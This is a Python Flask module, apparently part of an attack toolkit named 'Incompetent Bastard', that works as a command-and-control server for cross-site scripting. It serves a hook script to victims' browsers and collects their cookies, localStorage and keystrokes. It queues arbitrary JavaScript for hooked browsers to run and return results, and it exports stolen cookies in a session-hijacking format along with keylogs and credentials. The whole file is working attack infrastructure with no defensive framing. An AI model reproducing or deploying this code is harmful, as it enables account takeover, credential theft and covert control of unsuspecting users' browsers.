from meuk.hacksec import *
from flask import Blueprint, render_template, redirect, url_for, flash, send_from_directory, abort, request, Response, jsonify
from meuk.flask.models import *
from meuk.flask.security import require_dashboard_access
from datetime import date
import hashlib
import calendar
import datetime

 

vandaag = date.today()

appdata = db_instellingen.query.first()

xxs_bp = Blueprint('xxs_bp', __name__,
                    template_folder='html',
                    static_folder='static')


@xxs_bp.route("/x.js", methods=["GET","POST"])
@xxs_bp.route("/xxs.js", methods=["GET", "POST"])
def xss_hooked():
    ip = request.remote_addr
    if ip != appdata.ikzelf:
        ua = request.headers.get('User-Agent')
        loc = request.headers.get('Referer')
        md5 = hashlib.md5(str(ip+ua).encode())
        hebben = db_xxs_cookies.query.filter_by(ip=ip, agent=ua, md5=md5.hexdigest()).first()
        if hebben == None:
            bevdb = db_xxs_hooked(ip=ip, agent=ua, md5=md5.hexdigest())
            db.session.add(bevdb)
            db.session.commit()
        pagina = render_template('xss.html', localhost=appdata.localhost)
    else:
        pagina = render_template('xss-blanco.html', localhost=appdata.localhost)

    return pagina, 200, {
        'Content-Type': 'text/javascript',
        'Cache-Control': 'no-cache, no-store, must-revalidate',
        'Pragma': 'no-cache',
        'Expires': '0'
    }



@xxs_bp.route("/xxs/cookies", methods=["GET", "POST"])
def xss_cookies():
    ip = request.remote_addr
    if request.args.get('data') and ip != appdata.ikzelf:

        loc = request.headers.get('Referer')
        ua = request.headers.get('User-Agent')

        md5 = hashlib.md5(request.args.get('data').encode())
 
        hebben = db_xxs_cookies.query.filter_by(ip=ip, agent=ua, md5=md5.hexdigest()).first()
        if hebben == None:
            bevdb = db_xxs_cookies(ip=ip, agent=ua, locatie=loc, datum=vandaag, md5=md5.hexdigest(), cookies=request.args.get('data'))
            db.session.add(bevdb)
            db.session.commit()

        pagina = '[!] Tot ziens en bedankt voor de vis.'

        return pagina, 200, {
            'Content-Type': 'text/javascript',
            'Cache-Control': 'no-cache, no-store, must-revalidate',
            'Access-Control-Allow-Origin': 'http://'+(request.referrer if request.referrer else request.remote_addr),
            'Access-Control-Allow-Credentials': 'true',
            'Access-Control-Allow-Methods': 'POST, GET, OPTIONS',
            'Access-Control-Allow-Headers': 'Content-Type',
            'Vary': 'Origin',
            'Pragma': 'no-cache',
            'Expires': '0'
        }

    else:
        abort(404, description="[*] Incompetent Bastard v0.42\n[!] You failed!")

#xxe callback
@xxs_bp.route("/xxs/localstorage", methods=["GET", "POST"])
def xss_localstorage():

    ip = request.remote_addr
    if request.args.get('data') and ip != appdata.ikzelf:

        loc = request.headers.get('Referer')
        ua = request.headers.get('User-Agent')

        md5 = hashlib.md5(request.args.get('data').encode())
 
        hebben = db_xxs_localstorage.query.filter_by(ip=ip, agent=ua, md5=md5.hexdigest()).first()
        if hebben == None:
            bevdb = db_xxs_localstorage(ip=ip, agent=ua, locatie=loc, datum=vandaag, md5=md5.hexdigest(), localstorage=request.args.get('data'))
            db.session.add(bevdb)
            db.session.commit()

        pagina= '[!] Tot ziens en bedankt voor de vis.'

        return pagina, 200, {
            'Content-Type': 'text/javascript',
            'Cache-Control': 'no-cache, no-store, must-revalidate',
            'Access-Control-Allow-Origin': 'http://'+(request.referrer if request.referrer else request.remote_addr),
            'Access-Control-Allow-Credentials': 'true',
            'Access-Control-Allow-Methods': 'POST, GET',
            'Access-Control-Allow-Headers': 'Content-Type',
            'Vary': 'Origin',
            'Pragma': 'no-cache',
            'Expires': '0'
        }



    else:
        abort(404, description="[*] Incompetent Bastard v0.42\n[!] You failed!")

#xxe callback
@xxs_bp.route("/xxs/gebruiker", methods=["GET"])
def xss_cors():
    return '[!] Tot ziens en bedankt voor de vis.'

@xxs_bp.route("/xxs/commands", methods=["GET", "OPTIONS"])
def xss_c2():
    if request.method == 'OPTIONS':
        origin = request.headers.get('Origin', '*')
        return '', 204, {
            'Access-Control-Allow-Origin': origin,
            'Access-Control-Allow-Methods': 'GET, OPTIONS',
            'Access-Control-Allow-Headers': 'Content-Type',
            'Access-Control-Max-Age': '3600',
            'Vary': 'Origin',
        }
    ip = request.remote_addr

    # Heartbeat: update datum van hooked record zodat we "last seen" bijhouden
    hooked = db_xxs_hooked.query.filter_by(ip=ip).first()
    if hooked:
        hooked.datum = datetime.datetime.utcnow()
        db.session.commit()

    cmds = db_xxs_commands.query.filter(
        db_xxs_commands.status == 'queued',
        db.or_(db_xxs_commands.host == ip, db_xxs_commands.host == '*')
    ).all()

    js_parts = []
    host = appdata.localhost
    for cmd in cmds:
        js_parts.append(
            f"(function(){{try{{var _r=(function(){{{cmd.opdracht}}})();"
            f"new Image().src='{host}/xxs/commands/result?id={cmd.id}&data='+encodeURIComponent(String(_r||'ok'));}}"
            f"catch(_e){{new Image().src='{host}/xxs/commands/result?id={cmd.id}&data='+encodeURIComponent('ERROR: '+_e.message);}}}})();"
        )
        cmd.status = 'delivered'
    db.session.commit()

    pagina = '\n'.join(js_parts) if js_parts else '/* no commands */'

    origin = request.headers.get('Origin', '*')
    return pagina, 200, {
        'Content-Type': 'text/javascript',
        'Cache-Control': 'no-cache, no-store, must-revalidate',
        'Access-Control-Allow-Origin': origin,
        'Access-Control-Allow-Methods': 'GET, OPTIONS',
        'Access-Control-Allow-Headers': 'Content-Type',
        'Vary': 'Origin',
        'Pragma': 'no-cache',
        'Expires': '0'
    }


@xxs_bp.route("/xxs/commands/result", methods=["GET", "POST"])
def xss_c2_result():
    cmd_id = request.args.get('id', type=int)
    data = request.args.get('data', '')
    if cmd_id:
        cmd = db.session.get(db_xxs_commands, cmd_id)
        if cmd:
            cmd.result = data[:50000]
            cmd.status = 'completed'
            db.session.commit()
    return '', 204


@xxs_bp.route("/api/xxs/commands", methods=["GET"])
def api_xxs_commands_list():
    require_dashboard_access()
    cmds = db_xxs_commands.query.order_by(db_xxs_commands.id.desc()).all()
    return jsonify([{
        'id': c.id,
        'host': c.host,
        'opdracht': c.opdracht,
        'status': c.status or 'queued',
        'result': c.result,
        'created': c.created.isoformat() if c.created else None,
    } for c in cmds])


@xxs_bp.route("/api/xxs/commands", methods=["POST"])
def api_xxs_commands_create():
    require_dashboard_access()
    data = request.get_json(silent=True) or {}
    host = data.get('host', '*').strip() or '*'
    opdracht = data.get('opdracht', '').strip()
    if not opdracht:
        return jsonify({'error': 'opdracht is vereist'}), 400
    cmd = db_xxs_commands(host=host, opdracht=opdracht)
    db.session.add(cmd)
    db.session.commit()
    return jsonify({'id': cmd.id, 'status': cmd.status}), 201


@xxs_bp.route("/api/xxs/commands/<int:cmd_id>", methods=["DELETE"])
def api_xxs_commands_delete(cmd_id):
    require_dashboard_access()
    cmd = db.session.get(db_xxs_commands, cmd_id)
    if not cmd:
        return jsonify({'error': 'not found'}), 404
    db.session.delete(cmd)
    db.session.commit()
    return '', 204


@xxs_bp.route("/api/xxs/commands/clear", methods=["POST"])
def api_xxs_commands_clear():
    require_dashboard_access()
    db_xxs_commands.query.filter(
        db_xxs_commands.status.in_(['delivered', 'completed'])
    ).delete(synchronize_session=False)
    db.session.commit()
    return '', 204


@xxs_bp.route("/api/xxs/hooked", methods=["GET"])
def api_xxs_hooked():
    require_dashboard_access()
    cutoff = datetime.datetime.utcnow() - datetime.timedelta(minutes=5)
    recent = db_xxs_hooked.query.filter(
        db_xxs_hooked.datum >= cutoff
    ).order_by(db_xxs_hooked.datum.desc()).all()

    seen = {}
    for c in recent:
        if c.ip not in seen:
            seen[c.ip] = c
    clients = list(seen.values())

    return jsonify([{
        'id': c.id,
        'ip': c.ip,
        'agent': c.agent,
        'md5': c.md5,
        'datum': c.datum.isoformat() if c.datum else None,
    } for c in clients])


@xxs_bp.route("/xxs/keylogger", methods=["GET", "POST"])
def xss_keylogger():
    ip = request.remote_addr
    if ip != '127.3.0.1':


        loc = request.headers.get('Referer')
        ua = request.headers.get('User-Agent')
        data = request.args.get('data')
        if data == '':
            data =' '

        hebben = db_xxs_keylogger.query.filter_by(ip=ip, agent=ua, locatie=loc).first()
        if hebben == None:
            bevdb = db_xxs_keylogger(ip=ip, agent=ua, locatie=loc, datum=vandaag, toetsen=data)
            db.session.add(bevdb)
            db.session.commit()
        else:
            bevdb = db.session.get(db_xxs_keylogger, hebben.id)
            bevdb.toetsen = hebben.toetsen+data
            db.session.commit()
        pagina = '[!] Tot ziens en bedankt voor de vis.'

        return pagina, 200, {
            'Content-Type': 'text/javascript',
            'Cache-Control': 'no-cache, no-store, must-revalidate',
            'Access-Control-Allow-Origin': 'http://'+(request.referrer if request.referrer else request.remote_addr),
            'Access-Control-Allow-Credentials': 'true',
            'Access-Control-Allow-Methods': 'POST, GET',
            'Access-Control-Allow-Headers': 'Content-Type',
            'Vary': 'Origin',
            'Pragma': 'no-cache',
            'Expires': '0'
        }


    else:
        abort(404, description="[*] Incompetent Bastard v0.42\n[!] You failed!")


@xxs_bp.route("/dashboard/xxs", methods=["GET", "POST"])
def xxs_dashboard():
    cutoff = datetime.datetime.utcnow() - datetime.timedelta(minutes=5)
    recent = db_xxs_hooked.query.filter(db_xxs_hooked.datum >= cutoff).all()

    # Unieke IPs: bewaar alleen de meest recente entry per IP
    seen = {}
    for h in recent:
        if h.ip not in seen or (h.datum and h.datum > seen[h.ip].datum):
            seen[h.ip] = h
    hooked = list(seen.values())

    cookies = db_xxs_cookies.query.order_by('datum').all()
    keylogger = db_xxs_keylogger.query.order_by('datum').all()
    localstorage=db_xxs_localstorage.query.order_by('datum').all()

    pagina = render_template('xss_dashboard.html', cookies=cookies, keylogger=keylogger, localstorage=localstorage, hooked=hooked, aantalhooked=len(hooked))
    return pagina


@xxs_bp.route("/dashboard/xxs/download_cookies/<int:id>", methods=["GET", "POST"])
def xxs_download_cookies(id):

    date = datetime.datetime.utcnow()
    tijdstip = calendar.timegm(date.utctimetuple())

    cookies = db_xxs_cookies.query.filter_by(id=id)
    waarden = ''
    regel="\n[host]\tTRUE\t/\tFALSE\t[tijdstip]\t[naam]\t[waarde]"
    for x in cookies:
        for f in x.cookies.split(';'):
            y= f.split('=')
            waarden = waarden + regel.replace('[host]', str(x.ip)).replace('[tijdstip]', str(tijdstip)).replace('[naam]', str(y[0]).strip()).replace('[waarde]', str(f.replace(y[0]+'=','')).strip())


    header='''# Netscape HTTP Cookie File
# http://curl.haxx.se/rfc/cookie_spec.html
# This file was generated by Incompetent Bastard'''

    return header+waarden, 200, {
        'Cache-Control': 'private',
        'Content-type': 'application/text',
        'Content-Disposition': 'attachment; filename="cookies_'+x.ip+'.txt"',
        'Content-Length': str(len(header+waarden))}

@xxs_bp.route("/dashboard/xxs/download_toetsen/<int:id>", methods=["GET", "POST"])
def xxs_download_toetsen(id):

    date = datetime.datetime.utcnow()
    tijdstip = calendar.timegm(date.utctimetuple())

    data = db_xxs_keylogger.query.filter_by(id=id).first()
    waarden = data.toetsen



    header='''# Keylog: [host] ([agent])
# location: [locatie]
# This file was generated by Incompetent Bastard'''
    tekst = header.replace('[host]', data.ip).replace('[agent]', data.agent).replace('[locatie]', data.locatie)+"\n\n"+waarden
    return tekst, 200, {
        'Cache-Control': 'private',
        'Content-type': 'application/text',
        'Content-Disposition': 'attachment; filename="keylogger_'+data.ip+'.txt"',
        'Content-Length': str(len(tekst))}


@xxs_bp.route("/dashboard/xxs/download_localstorage/<int:id>", methods=["GET", "POST"])
def xxs_download_localstorage(id):

    date = datetime.datetime.utcnow()
    tijdstip = calendar.timegm(date.utctimetuple())

    data = db_xxs_localstorage.query.filter_by(id=id).first()
    waarden = data.localstorage



    header='''# LocalStorage: [host] ([agent])
# location: [locatie]
# This file was generated by Incompetent Bastard'''
    tekst = header.replace('[host]', data.ip).replace('[agent]', data.agent).replace('[locatie]', data.locatie)+"\n\n"+waarden
    return tekst, 200, {
        'Cache-Control': 'private',
        'Content-type': 'application/text',
        'Content-Disposition': 'attachment; filename="localstorage_'+data.ip+'.txt"',
        'Content-Length': str(len(tekst))}


@xxs_bp.route("/dashboard/xxs/download_creds/<int:id>", methods=["GET", "POST"])
def xxs_download_creds(id):

    date = datetime.datetime.utcnow()
    tijdstip = calendar.timegm(date.utctimetuple())

    data = db_xxs_localstorage.query.filter_by(id=id).first()
    waarden = data.username+':'+data.password



    header='''# Creds: [host] ([agent])
# location: [locatie]
# This file was generated by Incompetent Bastard'''
    tekst = header.replace('[host]', data.ip).replace('[agent]', data.agent).replace('[locatie]', data.locatie)+"\n\n"+waarden
    return tekst, 200, {
        'Cache-Control': 'private',
        'Content-type': 'application/text',
        'Content-Disposition': 'attachment; filename="localstorage_'+data.ip+'.txt"',
        'Content-Length': str(len(tekst))}